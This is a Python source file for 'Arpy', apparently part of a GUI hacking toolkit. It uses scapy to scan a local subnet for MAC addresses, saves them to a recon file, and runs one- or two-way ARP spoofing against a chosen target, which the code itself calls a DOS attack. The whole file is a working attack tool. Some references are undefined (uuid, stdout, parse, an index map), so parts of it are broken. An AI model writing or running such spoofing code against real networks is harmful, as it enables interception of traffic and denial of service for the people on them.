#imports
from scapy.all import *
from collections import OrderedDict
from uuid import getnode
from time import sleep, strftime

import argparse
import os
import ipaddress as ip 
import threading
import queue
import customtkinter
import sys
import json

RECON_PATH = "./recon/recon.json"


class Arpy:
    """Objects of this class contain methods which can launch an ARP spoofing attack. This particular script was is not meant
       to be modified, it should be interacted from the command line, you are welcome to read it so as to gain bettter understading of the 
       underlying features
    """
    
    MODULE_NAME = "Arpy"

    #Variables that should not be altered
    __IP_QUEUE = queue.Queue()
    __LOCAL_MAC = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])
    __IP_TO_MAC = dict()
    __OS_NAME = os.name
    __THREADS = list()
    
    def __init__(self, subnet:str, gateway:str, mac:str = __LOCAL_MAC, interval:int = None,two_way_flag:bool = False, target_ip:str =None, threads:int|str = 5, output_frame=None):
        """This method initialises the object and validates the object attributes
           
           :param subnet: Network address, e.g 192.168.1.0/24
           :param gateway: IP address of gateway
           :param mac: MAC address of attacker, this can be changed using the setter method set_mac(), see below
           :param interval: interval in seconds between gratuitous ARP reply to target/s
           :param two_way_flag: A bolean value which decides whether the ARP spoofing attacking in two way or on way
        """

        self.__MAC = mac 
        self.subnet = subnet
        self.gateway = gateway
        self.interval = interval
        self.two_way_flag = two_way_flag
        self.frame = output_frame
        self.target_ip = target_ip
        self.threads = threads
        
        
        self.__check_obj_attribute()
        
        for ip_addr in list(ip.IPv4Network(self.subnet).hosts()):
            self.__IP_QUEUE.put(str(ip_addr))
            
        
        if os.name == "nt":
           try:
               from colorama import init 
               init()
           except Exception as e:
               print(e)
                
        self.__UI()
        self.get_mac(target=self.target_ip, threads=self.threads)
    
    def __check_obj_attribute(self):
        """This method validates attributes of instances of this class, e.g correct types, valid IP addresses
           
        """

        try:
           
           private_subnet =  ip.IPv4Network(self.subnet).is_private
           private_gateway = ip.ip_address(self.gateway).is_private
           self.subnet = ip.IPv4Network(self.subnet)
           
           if private_subnet and private_gateway:
              pass 
           else:
              self.err_insert(text="Ip address is not private, please check both network address and IP address of gateway")
              sys.exit()
        except ip.AddressValueError:
            self.err_insert(text="Invalid IP Address")
            sys.exit()
        
        except ip.NetmaskValueError:
            self.err_insert(text="Invalid subnet mask value")
            sys.exit()
        except ValueError:
            self.err_insert(text="incorrect IP Format")
            sys.exit()
        
        if self.interval.isdigit():
           self.interval = int(self.interval)
        else:
          self.err_insert(text="Incorrect Interval value, make sure value is an int, e.g 2, which is also the recommended value(In seconds of course)")
          sys.exit()
          

        if type(self.two_way_flag) is not bool:
           self.err_insert("Something is wrong with the switch")
           sys.exit()
        
        if not self.target_ip or self.target_ip == "None":
           self.target_ip = None
        
        if self.target_ip and self.target_ip != "None":
           try:
              IPv4_obj = ip.IPv4Address(self.target_ip)
              if IPv4_obj in list(ip.IPv4Network(self.subnet).hosts()):
                 pass 
              else:
                 self.err_insert("Hmm..., target host does not appear to be in the same network. Please verify your input.")
                 sys.exit()
           except ip.AddressValueError:
              self.err_insert(text="Target IP is invalid")
              sys.exit()

        if type(self.threads) is str and not self.threads:
            self.threads = 5

        elif type(self.threads) is str and self.threads:
             if self.threads.isdigit() and int(self.threads) > 0:
                self.threads = int(self.threads)
             else:
                self.err_insert(text="Remember, thread value is always a positve integer.")
                sys.exit()
        else:
           self.err_insert("Unknown error with thread value, report issue to https://github.com/Haz3l-cmd")
           sys.exit()




          
 

    def __UI(self):
        """This method initialises the command line interface for the user
        """
        
        self.insert(text="Object attributes seem ok")
        
        if self.__OS_NAME == "nt":
           self.insert(text="Windows detected as OS")
        
        elif self.__OS_NAME == "posix":
             self.insert(text="Linux detected as OS, you may need to run the program as root")

        
        else:    
           self.err_insert(text="[-]Unknown OS, exiting module to prevent possible compatibility issues")

        if self.two_way_flag :
           # label3 = customtkinter.CTkLabel(master=self.frame, text = "[*] Two way poisoning: Enabled")
           # label3.pack(pady=5)
           self.insert(text="Two way poisoning: Enabled")

        else:
            self.insert(text = "Two way poisoning: Disabled") 
           


    def __get_mac(self,target:str =None):
        """This private method is invoked by get_mac
          
          :param target: IP addres of target, if target is None the method keeps taking an IP address from a Queue object until the Queue object is exhausted, i.e an exception is thrown as it is empty
        """

        
        if target is None:
            while True:
              try:

                 current_ip=self.__IP_QUEUE.get_nowait()
                 arp_ans = sr1(ARP(pdst=current_ip,hwlen=6,plen=4, op=1), verbose=False,timeout=1)
                 tgt_mac = arp_ans[0].hwsrc
                 if current_ip == self.gateway:
                    self.__IP_TO_MAC.update({current_ip:[tgt_mac,"Gateway"]})
                 else:   
                    self.__IP_TO_MAC.update({current_ip:tgt_mac})
            
              except queue.Empty:
                   # self.insert(text="Finished scanning whole subnet...")
                   break
                   
              except TypeError:
                   pass

              
        else:
            try:
                self.insert(text=f"Sending ARP request to {target}")
                arp_ans = sr1(ARP(pdst=target,hwlen=6,plen=4, op=1), verbose=False,timeout=1)
                tgt_mac = arp_ans[0].hwsrc
                self.__IP_TO_MAC.update({target:tgt_mac})
            
            except TypeError:
                self.err_insert(text = "Target is down or did not respond")
                sys.exit()
            
            




    
    def get_mac(self,target:str = None,threads:int =5):
        """This method is supposed to be accessed by the user, the latter spawns a specified number of threads to scan all the IP address on the network concurrently

           :param target: The IP address of the target,  if target is None the method keeps taking an IP address from a Queue object until the Queue object is exhausted, i.e an exception is thrown as it is empty
           :param threads: The number of threads to be spawned to scan the network concurrently, defaults to 5 
        """
    
        if target is None:
            self.insert(text = f"Starting {threads} threads")
            self.insert(text="Scanning..., This will vary with respect to the number of threads running")
            for _ in range(threads):
                self.__THREADS.append(threading.Thread(target=self.__get_mac, daemon=True))
               
            for thread in self.__THREADS:
                thread.start()

            for thread in self.__THREADS:
                thread.join()
            self.__THREADS.clear()
        else:
            self.__get_mac(target)
        
        with open(RECON_PATH, "w") as fp:
             json.dump(self.__IP_TO_MAC, fp, indent=4)

        for key in self.__IP_TO_MAC:
            self.insert(text = f"{key}->{self.__IP_TO_MAC.get(key)}")
        self.insert(text="Retrieved information has been temporarily saved in /recon/recon.json")
             
        

   
    def set_mac(self,mac:str): 
        """setter method which changes MAC address of attacker
           param mac: MAC address to change to
        """
        self.__LOCAL_MAC = mac


    def inject_packet(self,uindex:int , interval:int):
            """The method that actually lauches the attack and is invoked after the user selects the target
           
           :param uindex: Index of target, selected by the user
           :interval: interval in seconds between gratuitous ARP reply to target/s
            """
        
            try:
                 unsolicited_arp_rep_to_tgt = ARP(op=2,psrc=parse.gateway_ip, pdst=self.__INDEX_TO_IP.get(uindex), hwdst=self.__IP_TO_MAC.get(self.__INDEX_TO_IP.get(uindex)))
                 unsolicited_arp_rep_to_gtw = ARP(op=2,psrc=self.__INDEX_TO_IP.get(uindex), pdst=self.gateway, hwdst=self.__IP_TO_MAC.get(self.gateway), hwsrc=self.__LOCAL_MAC)
                 count = 1
                 stdout.write("DOS attack in progress. Press CTRL+C to end\n")
                 

                 while True :
                     send(unsolicited_arp_rep_to_tgt,verbose=False)
                     if self.two_way_flag:
                        send(unsolicited_arp_rep_to_gtw, verbose=False)
                     stdout.write("   Packet(s) sent : {}\r".format(count))
                     count += 1
                     sleep(interval)
            except KeyboardInterrupt:
                print("\nUser ended program")
    
    def insert(self, text=None):
        self.frame.configure(text_color="lime green")
        self.frame.configure(state="normal")
        self.frame.insert(index="end", text="\n[{}] (Using {}) : [+] {}".format(strftime("%H:%M:%S"),self.MODULE_NAME, text))
        self.frame.configure(state="disabled")
    
    
    def err_insert(self, text=None):
        self.frame.configure(text_color="orange")
        self.frame.configure(state="normal")
        self.frame.insert(index="end", text="\n[{}] (Using {}) : [-] {}".format(strftime("%H:%M:%S"),self.MODULE_NAME, text))
        self.frame.configure(state="disabled")

        
            







